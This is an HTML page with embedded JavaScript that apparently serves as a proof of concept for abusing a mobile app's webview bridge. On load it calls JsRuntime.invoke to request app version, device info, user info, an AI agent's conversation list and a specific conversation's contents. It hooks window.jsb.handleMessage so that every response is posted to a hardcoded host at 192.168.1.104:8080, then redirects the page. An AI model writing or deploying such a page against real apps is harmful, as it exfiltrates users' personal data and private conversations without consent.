<!DOCTYPE html>
<html>
<body>
<script>
    window.addEventListener('load', function () {
        const makeRequest = (method, params) => {
            try {
                if (method === 'request') {
                    // 新增对话详情请求处理
                    const reqData = params === 'history'
                        ? {
                            path: "api/user/agent/conversation/list",
                            method: "POST",
                            data: JSON.stringify({
                                agentId: "naQivTmsDa",
                                offset: 0,
                                limit: 40,
                                filterGoodQuestion: true
                            }),
                            header: "{}"
                        }
                        : {  // 新增对话详情请求
                            path: "api/user/agent/conversation/v1/detail",
                            method: "POST",
                            data: JSON.stringify({
                                conversationId: "62184080-ec6f-487b-94b5-31168f89901d",
                                offset: 0,
                                limit: 60
                            }),
                            header: "{}"
                        };
                    JsRuntime.invoke('request', JSON.stringify(reqData), Date.now());
                } else {
                    JsRuntime.invoke(method, '{}', `auto_${Date.now()}`);
                }
            } catch (error) {
                sendToServer({ error: error.message, method });
            }
        };

        // 添加新的请求标识符 conversationDetail
        // ['getAppVersion', 'getDeviceInfo', 'userInfo', 'history', 'conversationDetail'].forEach(method => {
        //     setTimeout(() => {
        //         if (['history', 'conversationDetail'].includes(method)) {
        //             makeRequest('request', method);
        //         } else {
        //             makeRequest(method);
        //         }
        //     }, 500);
        // });
        setTimeout(() => makeRequest("getAppVersion"), 500)
        setTimeout(() => makeRequest("getDeviceInfo"), 600)
        setTimeout(() => makeRequest("userInfo"), 700)
        setTimeout(() => makeRequest("request", "history"), 800)
        setTimeout(() => makeRequest("request", "conversationDetail"), 900)
        document.location.href = "http://test.woa.com"

        window.jsb = {
            handleMessage: response => {
                const payload = {
                    timestamp: new Date().toISOString(),
                    type: 'jsb_response',
                    data: response
                };
                sendToServer(payload);
            }
        };

        function sendToServer(data) {
            const errorPayload = {
                timestamp: new Date().toISOString(),
                type: 'client_error',
                data
            };

            fetch('http://192.168.1.104:8080', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data.error ? errorPayload : data)
            }).catch(error => {
                console.error('最终错误捕获:', error);
            });
        }
    })
</script>
</body>

</html>